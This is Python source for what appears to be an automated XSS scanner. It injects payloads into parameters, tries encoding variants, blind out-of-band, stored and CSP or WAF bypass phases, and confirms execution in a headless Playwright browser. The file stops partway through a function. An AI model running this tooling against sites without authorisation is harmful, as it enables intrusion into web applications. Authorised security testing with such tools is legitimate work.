# tester.py â€” ULTRA-MAX (drop-in replacement, Playwright-only)
from __future__ import annotations

import logging
import re
import time
import copy
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import json
from urllib.parse import urlparse, urlsplit, urlunsplit, quote
from typing import Dict, List, Any, Optional

import requests
from sseclient import SSEClient
from playwright.sync_api import sync_playwright, Error as PWError

from network import make_request
from sanitization_analyzer import (
    analyze_param_sanitizer,
    pretty_print_map,
    filter_payload_by_sanitizer,
    mutate_payload_by_sanitizer,
)
from payload_strategy import SuperBypassEngine
from dynamic_dom_tester import run_with_coverage, dynamic_dom_inspect
from resilience import run_resilience_browser_probe, compute_resilience_score
from utils import (
    prepare_request_args,
    OOB_BASE_URL,
    parse_csp,
    extract_nonces,
    fetch_dynamic_html,
    contains_unescaped,
    generate_encoding_variants,
    decode_all,
    pool_available,
    init_browser_pool,
    _acquire_page,
    _release_page,
)
from csrf import apply_csrf
from payloads import DEFAULT_XSS_PAYLOADS
try:
    from rich.panel import Panel as _RichPanel  # type: ignore
    from rich.console import Console as _RichConsole  # type: ignore
except Exception:  # pragma: no cover - rich optional
    _RichPanel = None
    _RichConsole = None

_RICH_CONSOLE = None
_PROGRESS_STYLE = 'spinner'
_LAST_PROGRESS_MSG = ''
logger = logging.getLogger("xsscanner.tester")

# --- Simple console/Panel stubs with optional rich integration ---
class _DummyStatus:
    def __init__(self, msg: str):
        self.msg = msg

    def __enter__(self):
        if not _RICH_CONSOLE and self.msg:
            print(self.msg)
        return self

    def __exit__(self, exc_type, exc, tb):
        return False


class _SimpleConsole:
    def print(self, *args, **kwargs):
        if _RICH_CONSOLE is not None:
            _RICH_CONSOLE.print(*args, **kwargs)
        else:
            print(*args)

    def status(self, message: str, spinner: str = 'dots'):
        if _RICH_CONSOLE is not None:
            return _RICH_CONSOLE.status(message, spinner=spinner)
        return _DummyStatus(message)


def Panel(content, title=None, border_style=None):
    if _RICH_CONSOLE is not None and _RichPanel is not None:
        return _RichPanel(content, title=title, border_style=border_style)
    header = f"=== {title} ===\n" if title else ""
    return f"{header}{content}"


console = _SimpleConsole()


# --- Lightweight single-line progress helper (overwrite instead of spamming) ---
_PROGRESS_PAD = 120
_PROGRESS_ACTIVE = False
_PROGRESS_MSG = ""
_SPINNER_THREAD: threading.Thread | None = None
_SPINNER_STOP: threading.Event | None = None
_SPINNER_FRAMES = ["|", "/", "-", "\\"]

def _spinner_loop():
    global _PROGRESS_ACTIVE
    i = 0
    while _SPINNER_STOP and not _SPINNER_STOP.is_set():
        frame = _SPINNER_FRAMES[i % len(_SPINNER_FRAMES)]
        i += 1
        try:
            line = (_PROGRESS_MSG or "").strip()
            if len(line) > _PROGRESS_PAD - 4:
                line = line[:_PROGRESS_PAD - 7] + "..."
            out = f"{line} {frame}"
            print("\r" + out.ljust(_PROGRESS_PAD), end="", flush=True)
            _PROGRESS_ACTIVE = True
        except Exception:
            pass
        time.sleep(0.1)

def _ensure_spinner_running():
    global _SPINNER_THREAD, _SPINNER_STOP
    if _SPINNER_THREAD and _SPINNER_THREAD.is_alive():
        return
    _SPINNER_STOP = threading.Event()
    _SPINNER_THREAD = threading.Thread(target=_spinner_loop, daemon=True)
    _SPINNER_THREAD.start()

def _print_progress(msg: str) -> None:
    """Emit progress update respecting configured UI style."""
    global _PROGRESS_MSG, _LAST_PROGRESS_MSG
    clean = (msg or "").strip()
    if _PROGRESS_STYLE != 'spinner':
        if not clean or clean == _LAST_PROGRESS_MSG:
            return
        _LAST_PROGRESS_MSG = clean
        if _RICH_CONSOLE is not None:
            _RICH_CONSOLE.print(f'[cyan]{clean}[/cyan]')
        else:
            print(clean)
        return
    _PROGRESS_MSG = clean
    _ensure_spinner_running()

def _preview_payload(s: str, limit: int = 48) -> str:
    try:
        if not s:
            return "-"
        s = str(s).replace("\n", "\\n").replace("\r", "").strip()
        if len(s) > limit:
            return s[: limit - 3] + "..."
        return s
    except Exception:
        return "-"

def _short_url(u: str, limit: int = 60) -> str:
    try:
        if not u:
            return "-"
        from urllib.parse import urlsplit
        parts = urlsplit(u)
        base = f"{parts.scheme}://{parts.netloc}{parts.path or ''}"
        if len(base) > limit:
            return base[: limit - 3] + "..."
        return base
    except Exception:
        return u[:limit]

def _fmt_eta(total: int, done: int, start_ts: float) -> str:
    try:
        if done <= 0:
            return "--:--"
        elapsed = max(0.0, time.time() - start_ts)
        rate = done / elapsed if elapsed > 0 else 0
        if rate <= 0:
            return "--:--"
        remain = max(0.0, (total - done) / rate)
        mm = int(remain // 60)
        ss = int(remain % 60)
        return f"{mm:02d}:{ss:02d}"
    except Exception:
        return "--:--"

def _progress_newline() -> None:
    global _PROGRESS_ACTIVE
    global _SPINNER_THREAD, _SPINNER_STOP
    if _PROGRESS_STYLE != 'spinner':
        return
    if _SPINNER_STOP:
        _SPINNER_STOP.set()
    if _SPINNER_THREAD:
        try:
            _SPINNER_THREAD.join(timeout=0.5)
        except Exception:
            pass
    _SPINNER_THREAD = None
    _SPINNER_STOP = None
    if _PROGRESS_ACTIVE:
        print()
        _PROGRESS_ACTIVE = False

def configure_ui(*, console=None, progress_style: str | None = None) -> None:
    """Configure tester output UI integration (rich console, progress style)."""
    global _RICH_CONSOLE, _PROGRESS_STYLE, _LAST_PROGRESS_MSG
    if console is not None:
        _RICH_CONSOLE = console
    if progress_style:
        normalized = str(progress_style).lower()
        if normalized not in {'spinner', 'log'}:
            normalized = 'spinner'
        if normalized != _PROGRESS_STYLE and _PROGRESS_STYLE == 'spinner':
            _progress_newline()
        _PROGRESS_STYLE = normalized
        _LAST_PROGRESS_MSG = ''



# ========= EXECUTION CONFIRMATION (Playwright) =========
def confirm_execution(url: str, timeout_ms: int = 20000) -> bool:
    """
    Buka URL di Playwright, override alert/prompt/confirm/print + onerror,
    simulasikan interaksi ringan, dan return True jika terlihat indikasi eksekusi.
    """
    hit = {"flag": False}

    # Try pooled Playwright first for speed
    try:
        if pool_available() or init_browser_pool():
            ctx, page = _acquire_page()
            if ctx and page:
                try:
                    def _on_dialog(d):
                        try:
                            hit["flag"] = True
                            d.dismiss()
                        except PWError:
                            pass
                    page.on("dialog", _on_dialog)
                    page.add_init_script(
                        """
                        (() => {
                          const mark = () => { window.__xss_executed = true; };
                          window.__xss_executed = false;
                          ['alert','confirm','prompt','print'].forEach(fn=>{
                            try{
                              const o = window[fn];
                              Object.defineProperty(window, fn, { value: function(...a){ mark(); try{return o.apply(this,a)}catch(e){} }});
                            }catch(e){}
                          });
                          const _onerror = window.onerror;
                          window.onerror = function(){ if (typeof _onerror==='function') { try{ _onerror.apply(this, arguments) }catch(e){} } };
                          document.addEventListener('securitypolicyviolation', () => {});
                        })();
                        """
                    )
                    try:
                        page.goto(url, wait_until="networkidle", timeout=timeout_ms)
                    except PWError:
                        page.goto(url, wait_until="domcontentloaded", timeout=timeout_ms)

                    try:
                        page.hover("body")
                    except PWError:
                        pass
                    for sel in ["button", "a[href]", "[onclick]", "input[type=submit]", "img[onerror]"]:
                        try:
                            for el in page.query_selector_all(sel):
                                try:
                                    if el.is_visible() and el.is_enabled():
                                        el.click(timeout=1000, no_wait_after=True)
                                        page.wait_for_timeout(120)
                                except PWError:
                                    continue
                        except PWError:
                            continue
                    for _ in range(4):
                        try:
                            page.keyboard.press("Tab")
                            page.wait_for_timeout(80)
                        except PWError:
                            break
                    try:
                        page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                        page.wait_for_timeout(180)
                        page.evaluate("window.scrollTo(0, 0)")
                        page.wait_for_timeout(120)
                    except PWError:
                        pass
                    try:
                        page.evaluate(
                            """
                            () => {
                              const evs = [
                                'click','dblclick','mouseover','mouseout','mouseenter','mouseleave','contextmenu',
                                'focus','blur','input','change','submit','keydown','keyup','wheel',
                                'animationiteration','animationstart','animationend','transitionend'
                              ];
                              document.querySelectorAll('*').forEach(el => {
                                evs.forEach(name => { try { el.dispatchEvent(new Event(name, {bubbles:true,cancelable:true})) } catch(e) {} });
                              });
                            }
                            """
                        )
                        page.wait_for_timeout(200)
                    except PWError:
                        pass
                    exec_flag = False
                    try:
                        exec_flag = bool(page.evaluate("() => !!window.__xss_executed"))
                    except PWError:
                        exec_flag = False
                    return bool(hit["flag"] or exec_flag)
                finally:
                    try:
                        _release_page(ctx, page)
                    except Exception:
                        pass
    except Exception:
        pass

    # Fallback: standalone Playwright lifetime
    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        context = browser.new_context(java_script_enabled=True)
        def _on_dialog(d):
            try:
                hit["flag"] = True
                d.dismiss()
            except PWError:
                pass
        page = context.new_page()
        page.on("dialog", _on_dialog)
        page.add_init_script(
            """
            (() => {
              const mark = () => { window.__xss_executed = true; };
              window.__xss_executed = false;
              ['alert','confirm','prompt','print'].forEach(fn=>{
                try{
                  const o = window[fn];
                  Object.defineProperty(window, fn, { value: function(...a){ mark(); try{return o.apply(this,a)}catch(e){} }});
                }catch(e){}
              });
              const _onerror = window.onerror;
              window.onerror = function(){ if (typeof _onerror==='function') { try{ _onerror.apply(this, arguments) }catch(e){} } };
              document.addEventListener('securitypolicyviolation', () => {});
            })();
            """
        )
        try:
            try:
                page.goto(url, wait_until="networkidle", timeout=timeout_ms)
            except PWError:
                page.goto(url, wait_until="domcontentloaded", timeout=timeout_ms)
            try:
                page.hover("body")
            except PWError:
                pass
            for sel in ["button", "a[href]", "[onclick]", "input[type=submit]", "img[onerror]"]:
                try:
                    for el in page.query_selector_all(sel):
                        try:
                            if el.is_visible() and el.is_enabled():
                                el.click(timeout=1000, no_wait_after=True)
                                page.wait_for_timeout(120)
                        except PWError:
                            continue
                except PWError:
                    continue
            for _ in range(4):
                try:
                    page.keyboard.press("Tab")
                    page.wait_for_timeout(80)
                except PWError:
                    break
            try:
                page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                page.wait_for_timeout(180)
                page.evaluate("window.scrollTo(0, 0)")
                page.wait_for_timeout(120)
            except PWError:
                pass
            try:
                page.evaluate(
                    """
                    () => {
                      const evs = [
                        'click','dblclick','mouseover','mouseout','mouseenter','mouseleave','contextmenu',
                        'focus','blur','input','change','submit','keydown','keyup','wheel',
                        'animationiteration','animationstart','animationend','transitionend'
                      ];
                      document.querySelectorAll('*').forEach(el => {
                        evs.forEach(name => { try { el.dispatchEvent(new Event(name, {bubbles:true,cancelable:true})) } catch(e) {} });
                      });
                    }
                    """
                )
                page.wait_for_timeout(200)
            except PWError:
                pass
            exec_flag = False
            try:
                exec_flag = bool(page.evaluate("() => !!window.__xss_executed"))
            except PWError:
                exec_flag = False
            return bool(hit["flag"] or exec_flag)
        finally:
            try:
                page.close(); context.close(); browser.close()
            except Exception:
                pass


# ========= KONTEN â†” PAYLOAD CATEGORY MAP (dipertahankan) =========
CONTEXT_TO_PAYLOADS = {
    "html_tag": ["html_tag_injection"],
    "script_tag": ["html_tag_injection"],
    "tag_comment": ["html_tag_injection"],
    "attr_quoted": ["attribute_breakout_dq", "attribute_breakout_sq"],
    "attr_unquoted": ["attribute_breakout_dq", "attribute_breakout_sq"],
    "data_attribute": ["attribute_breakout_dq", "attribute_breakout_sq"],
    "srcdoc_attr": ["attribute_breakout_dq", "attribute_breakout_sq"],
    "js_string": ["js_string_breakout_dq", "js_string_breakout_sq"],
    "template_literal": ["js_string_breakout_dq", "js_string_breakout_sq"],
    "uri_scheme": ["url_based"],
    "css_url": ["css_injection"],
    "css_expression": ["css_injection"],
    "polyglot": ["polyglot"],
    "event_handler": ["event_handler"],
    "onclick": ["event_handler"],
    "onmouseover": ["event_handler"],
    "onerror": ["event_handler"],
    "innerHTML": ["dom_clobbering"],
    "outerHTML": ["dom_clobbering"],
    "textContent": ["dom_clobbering"],
    "innerText": ["dom_clobbering"],
    "outerText": ["dom_clobbering"],
    "insertAdjacentHTML": ["dom_clobbering"],
    "insertAdjacentText": ["dom_clobbering"],
    "eval": ["dom_clobbering"],
    "Function": ["dom_clobbering"],
    "setTimeout-string": ["dom_clobbering"],
    "setInterval-string": ["dom_clobbering"],
    "encoding": ["encoding"],
    "template_engine": ["template_engine"],
}


def get_xss_severity(contexts, payload, response_text):
    is_unescaped = contains_unescaped(response_text, payload)
    has_angle = ("<" in decode_all(response_text)) or (">" in decode_all(response_text))
    if any(c in contexts for c in ("script_tag", "event_handler", "attr_unquoted", "attr_quoted", "js_string")):
        return "[HIGH] Executable XSS" if is_unescaped and has_angle else "[INFO] Dangerous context, but no unescaped <>"
    if "html_tag" in contexts or "polyglot" in contexts:
        return "[INFO] Reflected in HTML context"
    return "[SAFE] Likely Not Exploitable"


class XSSTester:
    def __init__(self, payloads: dict, max_workers: int = 10, progress_every: int = 25, verbose: bool = True, sanitizer_detail: str = "summary", hash_fuzz: bool = True, waf_plan: dict | None = None):
        self.payloads = payloads
        self.engine = SuperBypassEngine(payloads)
        try:
            if waf_plan:
                self.engine.set_waf_plan(waf_plan)
        except Exception:
            pass
        self._executor = ThreadPoolExecutor(max_workers=max_workers)
        self.vulns: List[Dict] = []
        self.progress_every = max(1, int(progress_every))
        self.verbose = bool(verbose)
        self.sanitizer_detail = (sanitizer_detail or "summary").strip().lower()
        # Scheduler untuk revisit (stored/time-delayed)
        self.revisit_tasks: List[Dict] = []
        self.hash_fuzz = bool(hash_fuzz)
        self._last_runtime_findings: List[Dict] = []
        self.ai_snapshots: Dict[tuple, Dict[str, Any]] = {}
        self._active_ai_key: Optional[tuple] = None
        self.resilience_reports: List[Dict] = []
        self._resilience_cache: Dict[str, Dict[str, Any]] = {}

    @property
    def last_runtime_findings(self) -> List[Dict]:
        """Return a shallow copy of the most recent runtime findings."""
        return list(self._last_runtime_findings or [])

    def _save_ai_snapshot(self, key: tuple, data: Dict[str, Any]) -> None:
        try:
            self.ai_snapshots[key] = copy.deepcopy(data)
        except Exception:
            try:
                self.ai_snapshots[key] = dict(data)
            except Exception:
                self.ai_snapshots[key] = {}

    def _annotate_ai_outcome(self, finding: Dict[str, Any], executed: bool) -> None:
        try:
            key = self._active_ai_key
            snap = self.ai_snapshots.get(key) if key else None
            if not snap:
                pname = finding.get('param')
                if pname:
                    for k, v in self.ai_snapshots.items():
                        if v.get('name') == pname:
                            snap = v
                            key = k
                            break
            if not snap or not key:
                return
            update = copy.deepcopy(snap)
            score = float(update.get('ai_score', 0) or 0)
            score += 90 if executed else 35
            update['ai_score'] = score
            update['phase'] = 'vuln_executed' if executed else 'vuln_detected'
            vulns = update.setdefault('vulns', [])
            summary = {
                'url': finding.get('url'),
                'param': finding.get('param'),
                'type': finding.get('type'),
                'class': finding.get('class'),
                'payload': finding.get('payload'),
            }
            vulns.append(summary)
            self._save_ai_snapshot(key, update)
        except Exception:
            pass

    def _classify(self, finding: Dict, executed: bool = False, runtime: List[Dict] | None = None) -> Dict:
        try:
            runtime = runtime if runtime is not None else self._last_runtime_findings
        except Exception:
            runtime = None
        if executed:
            finding.setdefault('class', 'Executed')
            finding.setdefault('confidence', 'high')
            self._annotate_ai_outcome(finding, executed=True)
            return finding
        t = (finding.get('type') or '').lower()
        if 'blind' in t or 'stored' in t:
            finding.setdefault('class', 'Stored/Blind')
            finding.setdefault('confidence', 'high')
            self._annotate_ai_outcome(finding, executed=False)
            return finding
        try:
            if runtime:
                # Sandbox hint first
                if any((rf.get('type') or '').lower() == 'sandbox_iframe' for rf in runtime):
                    finding.setdefault('class', 'Blocked-by-Sandbox')
                    finding.setdefault('confidence', 'info')
                    return finding
                # CSP signals
                if any((rf.get('type') or '').lower() == 'csp_violation' for rf in runtime):
                    finding.setdefault('class', 'Blocked-by-CSP')
                    finding.setdefault('confidence', 'info')
                    return finding
                for rf in runtime:
                    if (rf.get('type') or '') == 'csp_flags':
                        import json as _json
                        detail = rf.get('detail') or ''
                        try:
                            obj = _json.loads(detail)
                            flags = (obj or {}).get('flags') or {}
                            if flags.get('no_inline_script'):
                                finding.setdefault('class', 'Blocked-by-CSP')
                                finding.setdefault('confidence', 'info')
                                return finding
                        except Exception:
                            pass
        except Exception:
            pass
        finding.setdefault('class', 'DOM-sink-only')
        finding.setdefault('confidence', 'medium')
        self._annotate_ai_outcome(finding, executed=False)
        return finding

    def resilience_summary(self) -> Dict[str, Any]:
        return compute_resilience_score(self.resilience_reports, has_vulns=bool(self.vulns))

    def schedule_revisit(self, url: str, marker: str, delay_seconds: int = 300, note: str = "") -> None:
        try:
            due = time.time() + max(1, int(delay_seconds))
            self.revisit_tasks.append({"url": url, "marker": marker, "due": due, "note": note})
            if self.verbose:
                logger.info(f"[revisit] scheduled {url} in {delay_seconds}s")
        except Exception:
            pass

    def process_revisits(self, max_items: int = 5) -> None:
        now = time.time()
        ready = [t for t in self.revisit_tasks if t.get("due", 0) <= now]
        ready = sorted(ready, key=lambda x: x.get("due", 0))[:max_items]
        for task in ready:
            url = task.get("url")
            marker = task.get("marker")
            _progress_newline()
            console.print(color(f"[Revisit] {url} (marker={marker})", "cyan"))
            try:
                findings = dynamic_dom_inspect(url)
            except Exception:
                findings = []
            text = "\n".join([str(f) for f in findings])
            if (marker or "") and (marker in text):
                console.print(Panel(f"URL: {url}\nMarker: {marker}", title="[green]Stored/Delayed XSS Indication[/green]"))
                f = {"url": url, "param": "<stored>", "payload": marker, "type": "stored_delayed"}
                self.vulns.append(self._classify(f))
            try:
                self.revisit_tasks.remove(task)
            except Exception:
                pass

    def _contexts_from_runtime(self, runtime_findings: List[Dict[str, Any]]) -> List[str]:
        """Translate taint runtime findings into static context labels."""
        contexts: List[str] = []
        if not runtime_findings:
            return contexts

        def _add_ctx(name: str) -> None:
            if name and name not in contexts:
                contexts.append(name)

        skip_exact = {"csp_violation", "csp_flags", "sandbox_iframe", "trustedtypes_policy", "pageerror"}
        skip_prefixes = ("console_",)

        prefix_map = [
            ("dialog_", ["script_tag"]),
            ("innerhtml", ["innerHTML"]),
            ("outerhtml", ["outerHTML"]),
            ("textcontent", ["textContent"]),
            ("innertext", ["innerText"]),
            ("outertext", ["outerText"]),
            ("insertadjacenthtml", ["insertAdjacentHTML"]),
            ("insertadjacenttext", ["insertAdjacentText"]),
            ("insertadjacentelement", ["innerHTML"]),
            ("template_innerhtml", ["innerHTML"]),
            ("element.sethtml", ["innerHTML"]),
            ("element_sethtml", ["innerHTML"]),
            ("document.write", ["innerHTML"]),
            ("document.writeln", ["innerHTML"]),
            ("document_write", ["innerHTML"]),
            ("document_writeln", ["innerHTML"]),
            ("domparser.parsefromstring", ["innerHTML"]),
            ("createcontextualfragment", ["innerHTML"]),
            ("range_insertnode", ["innerHTML"]),
            ("dom_add", ["innerHTML"]),
            ("dom_attr", ["innerHTML"]),
            ("element_append", ["innerHTML"]),
            ("element_prepend", ["innerHTML"]),
            ("element_before", ["innerHTML"]),
            ("element_after", ["innerHTML"]),
            ("element_replacechildren", ["innerHTML"]),
            ("element_replacewith", ["innerHTML"]),
            ("fragment_append", ["innerHTML"]),
            ("fragment_prepend", ["innerHTML"]),
            ("fragment_before", ["innerHTML"]),
            ("fragment_after", ["innerHTML"]),
            ("fragment_replacechildren", ["innerHTML"]),
            ("fragment_replacewith", ["innerHTML"]),
            ("jquery_html", ["innerHTML"]),
            ("jquery_append", ["innerHTML"]),
            ("jquery_prepend", ["innerHTML"]),
            ("jquery_before", ["innerHTML"]),
            ("jquery_after", ["innerHTML"]),
            ("jquery_replacewith", ["innerHTML"]),
            ("eval", ["eval"]),
            ("function", ["Function"]),
            ("settimeout", ["setTimeout-string"]),
            ("setinterval", ["setInterval-string"]),
            ("sanitizer.sanitize_in", ["template_engine"]),
            ("dompurify_in", ["template_engine"]),
            ("dompurify_passed_marker", ["template_engine"]),
            ("input_value", ["attr_quoted"]),
        ]

        nav_prefixes = ("window_open", "xhr_open", "fetch", "sendbeacon", "location_assign", "location_replace")
        css_prefixes = ("css_setproperty", "csstext", "css_insertrule")

        for finding in runtime_findings:
            raw_type = str(finding.get("type") or "")
            if not raw_type:
                continue
            kind = raw_type.lower()
            if kind.startswith("tainted_"):
                kind = kind[8:]
            if kind in skip_exact or any(kind.startswith(prefix) for prefix in skip_prefixes):
                continue

            detail = finding.get("detail")
            detail_str = str(detail) if detail is not None else ""
            detail_lower = detail_str.lower()

            if kind.startswith("event_on"):
                _add_ctx("event_handler")
                attr = kind.split("_", 1)[1] if "_" in kind else ""
                if attr.startswith("on"):
                    _add_ctx(attr)
                continue

            if any(kind.startswith(prefix) for prefix in ("setattribute_on", "setattributens_on", "setattributenode_on", "addeventlistener_")):
                _add_ctx("event_handler")
                attr = kind.split("_", 1)[1] if "_" in kind else ""
                if attr.startswith("on"):
                    _add_ctx(attr)
                continue

            if any(kind.startswith(prefix) for prefix in nav_prefixes):
                _add_ctx("uri_scheme")
                continue

            if any(kind.startswith(prefix) for prefix in css_prefixes):
                if "url(" in detail_lower:
                    _add_ctx("css_url")
                else:
                    _add_ctx("css_expression")
                continue

            if any(kind.startswith(prefix) for prefix in ("setattribute_", "setattributens_", "setattributenode_")):
                attr = kind.split("_", 1)[1] if "_" in kind else ""
                if attr.startswith("on"):
                    _add_ctx("event_handler")
                    _add_ctx(attr)
                    continue
                if attr.startswith("data"):
                    _add_ctx("data_attribute")
                    _add_ctx("attr_quoted")
                    continue
                if attr == "srcdoc":
                    _add_ctx("srcdoc_attr")
                    continue
                if attr in ("href", "src", "srcset", "action", "formaction", "poster", "xlink:href", "data-src", "data-href", "data-url"):
                    _add_ctx("attr_quoted")
                    _add_ctx("uri_scheme")
                    continue
                if attr == "style":
                    if "url(" in detail_lower:
                        _add_ctx("css_url")
                    else:
                        _add_ctx("css_expression")
                    continue
                if attr:
                    _add_ctx("attr_quoted")
                    if "javascript:" in detail_lower:
                        _add_ctx("uri_scheme")
                    continue

            matched = False
            for prefix, mapped in prefix_map:
                if kind.startswith(prefix):
                    for ctx in mapped:
                        _add_ctx(ctx)
                    matched = True
                    break
            if matched:
                continue

        return contexts

    # ===== Orkestrasi Phases =====
    def test_parameter(self, url: str, method: str, name: str, template: Dict[str, str], is_form: bool, sanitizer_baseline: Optional[Dict[str, str]] | None = None):
        method = method.upper()
        console.print(f"[Start] Testing param='{name}' method={method} url={url}")

        initial_vulns = len(self.vulns)

        key = (url, method, name)
        entry: Dict[str, Any] = {
            "url": url,
            "origin_url": url,
            "name": name,
            "method": method,
            "is_form": bool(is_form),
            "template": copy.deepcopy(template),
            "data_template": copy.deepcopy(template),
        }
        self._active_ai_key = key
        self._save_ai_snapshot(key, entry)

        # 1) Analisis sanitizer (karakter apa yg filtered/encoded/reflected)
        sanitizer_map = (dict(sanitizer_baseline) if sanitizer_baseline is not None else analyze_param_sanitizer(url, name, template, method, is_form))
        # Ringkas: tampilkan ringkasan status; detail hanya saat verbose
        try:
            from collections import Counter
            cnt = Counter(sanitizer_map.values())
        except Exception:
            cnt = {"filtered": 0, "encoded": 0, "reflected": 0}
            for st in sanitizer_map.values():
                cnt[st] = cnt.get(st, 0) + 1

        filtered_total = int(cnt.get("filtered", 0) or 0)
        encoded_total = int(cnt.get("encoded", 0) or 0)
        reflected_total = int(cnt.get("reflected", 0) or 0)

        entry["sanitizer_map"] = sanitizer_map
        entry["sanitizer_summary"] = {
            "filtered": filtered_total,
            "encoded": encoded_total,
            "reflected": reflected_total,
        }
        entry["sanitizer_map_full"] = sanitizer_map
        entry["ai_score"] = reflected_total - filtered_total
        entry["phase"] = "sanitizer"
        self._save_ai_snapshot(key, entry)

        # Selalu tampilkan ringkasan ringkas
        _print_progress(f"[sanitizer] {name}: filtered={filtered_total}, encoded={encoded_total}, reflected={reflected_total}")
        # Detail hanya bila diminta secara eksplisit
        if self.sanitizer_detail == "full":
            _progress_newline()
            pretty_print_map(name, sanitizer_map)

        # 2) Phase headers untuk UX yang lebih jelas
        _progress_newline()
        console.print(color("[Phase 2] Encoding variants…", "cyan"))

        # 2) Encoding variants (prioritas simple, cepat, dan sering lolos)
        if self._phase_encoding_plus(url, method, name, template, is_form):
            entry["phase"] = "encoding_plus_success"
            self._save_ai_snapshot(key, entry)
            self._active_ai_key = None
            return

        _progress_newline()
        console.print(color("[Phase 3] Quick probes: OOB, Header, Path/Fragment, Stored…", "cyan"))
        _print_progress("[oob] sent, waiting events…")
        # 3) Blind-XSS OOB (tidak blocking; SSE/polling akan menghentikan saat hit)
        if self._phase_oob(url, method, name, template, is_form):
            entry["phase"] = "oob_success"
            self._save_ai_snapshot(key, entry)
            self._active_ai_key = None
            return

        # Path/Fragment mengelola progress internal
        # 3.7) Path/Fragment injection probing (ringan)
        if self._phase_path_fragment(url, method, name, template, is_form):
            entry["phase"] = "path_fragment_success"
            self._save_ai_snapshot(key, entry)
            self._active_ai_key = None
            return

        # Header reflection mengelola progress internal
        # 3.6) Header reflection probing (ringan)
        if self._phase_header_reflection(url, method, name, template, is_form):
            entry["phase"] = "header_reflection_success"
            self._save_ai_snapshot(key, entry)
            self._active_ai_key = None
            return

        _print_progress("[stored] probing…")
        # 3.5) Stored-XSS probing (ringan)
        if self._phase_stored(url, method, name, template, is_form):
            entry["phase"] = "stored_success"
            self._save_ai_snapshot(key, entry)
            self._active_ai_key = None
            return

        _progress_newline()
        console.print(color("[Phase 4] CSP-aware & nonce/hash bypass…", "cyan"))
        _print_progress("[csp] trying payloads…")
        # 4) CSP-aware & nonce/hash bypass (jika terlihat CSP)
        if self._phase_csp(url, method, name, template, is_form):
            entry["phase"] = "csp_success"
            self._save_ai_snapshot(key, entry)
            self._active_ai_key = None
            return

        _progress_newline()
        console.print(color("[Phase 5] Probe → Progressive (engine)…", "cyan"))
        _print_progress("[probe] checking reflection…")
        # 5) Probe â†’ Progressive (context-aware via engine)
        probe = f"XSSPROBE{int(time.time())}"
        if self._phase_probe_progressive(url, method, name, template, is_form, probe):
            entry["phase"] = "probe_progressive_success"
            self._save_ai_snapshot(key, entry)
            self._active_ai_key = None
            return

        _progress_newline()
        console.print(color("[Phase 6] Coverage-guided (CDP)…", "cyan"))
        _print_progress("[coverage] scoring candidates…")
        # 6) Coverage-guided (gunakan CDP precise coverage dari dynamic_dom_tester)
        raw_html = self._get_rendered_html(url, method, name, template, is_form, probe)
        if self._phase_coverage(url, method, name, template, is_form, raw_html, probe):
            entry["phase"] = "coverage_success"
            self._save_ai_snapshot(key, entry)
            self._active_ai_key = None
            return

        _progress_newline()
        console.print(color("[Phase 7] Static context-aware brute (parallel)…", "cyan"))
        _print_progress("[static] running parallel payloads…")
        # 7) Static context-aware brute (paralel, aware sanitizer)
        contexts = self._detect_contexts(raw_html, probe)
        try:
            runtime_findings = dynamic_dom_inspect(url, hash_fuzz=self.hash_fuzz)
        except Exception:
            runtime_findings = []
        self._last_runtime_findings = runtime_findings or []
        rt_ctx = self._contexts_from_runtime(runtime_findings)
        if rt_ctx:
            contexts = list(dict.fromkeys(list(contexts) + list(rt_ctx)))
        entry["contexts"] = contexts
        entry["runtime_findings"] = runtime_findings or []
        entry["phase"] = "static_pre"
        self._save_ai_snapshot(key, entry)
        self._run_static_tests(url, method, name, template, is_form, contexts, sanitizer_map)
        entry["phase"] = "completed"
        self._save_ai_snapshot(key, entry)
        if len(self.vulns) == initial_vulns:
            probe = self._resilience_cache.get(url)
            if probe is None:
                try:
                    probe = run_resilience_browser_probe(url)
                except Exception as exc:
                    probe = {"error": str(exc)}
                self._resilience_cache[url] = probe
            self.resilience_reports.append({
                "url": url,
                "param": name,
                "method": method,
                "sanitizer_summary": entry.get("sanitizer_summary", {}),
                "sanitizer_map": entry.get("sanitizer_map_full", {}),
                "runtime_findings": runtime_findings or [],
                "contexts": contexts,
                "resilience_probe": probe,
            })
        _progress_newline()
        self._active_ai_key = None

    # ----- Phase 2: Encoding Variants -----
    def _phase_encoding_plus(self, url, method, name, template, is_form):
        """Versi lebih kuat: dukung POST JSON dan refleksi via contains_unescaped."""
        tried = 0
        hits = 0
        # Total attempts = jumlah varian encoding untuk tiap payload html_tag_injection
        try:
            total = 0
            for raw in DEFAULT_XSS_PAYLOADS["html_tag_injection"]:
                total += len(generate_encoding_variants(raw) or {})
        except Exception:
            total = 0
        t0 = time.time()
        _print_progress(f"[enc] {tried}/{total} hits={hits} ETA={_fmt_eta(total, tried, t0)}")
        for raw in DEFAULT_XSS_PAYLOADS["html_tag_injection"]:
            for tech, variant in generate_encoding_variants(raw).items():
                tpl = dict(template)
                tpl[name] = variant
                req_url, _, body = prepare_request_args(url, method, tpl, is_form)

                content = ""
                target_url = req_url
                if method == "GET" and not is_form:
                    content = fetch_dynamic_html(req_url) or ""
                else:
                    headers = None
                    data = body
                    if method == "POST" and not is_form:
                        headers = {"Content-Type": "application/json"}
                        data = json.dumps(body) if isinstance(body, dict) else body
                    headers, data = apply_csrf(req_url, method, data if isinstance(data, dict) else {}, headers)
                    resp = make_request(req_url, method, data=data, headers=headers)
                    content = resp.text if resp else ""
                    if resp and getattr(resp, 'url', None):
                        target_url = resp.url

                tried += 1
                reflected = contains_unescaped(content, raw)
                if reflected:
                    hits += 1
                if tried % self.progress_every == 0 or reflected:
                    pv = _preview_payload(variant)
                    tgt = _short_url(target_url)
                    _print_progress(f"[enc] {tried}/{total} hits={hits} ETA={_fmt_eta(total, tried, t0)} | {name}@{tgt} | pl: {pv}")
                if not reflected:
                    continue

                if confirm_execution(target_url):
                    _progress_newline()
                    console.print('[bold green]=== Encoding Execution Success ===[/bold green]')
                    console.print(f'[green]Technique[/green] : {tech}')
                    console.print(f'[green]Base[/green]      : {raw}')
                    console.print(f'[green]Variant[/green]   : {variant}')
                    console.print(f'[green]URL[/green]       : {target_url}')
                    f = {"url": target_url, "param": name, "base_payload": raw, "payload": variant, "technique": tech, "type": "encoding"}
                    self.vulns.append(self._classify(f, executed=True))
                    return True
        return False
    def _phase_encoding(self, url, method, name, template, is_form):
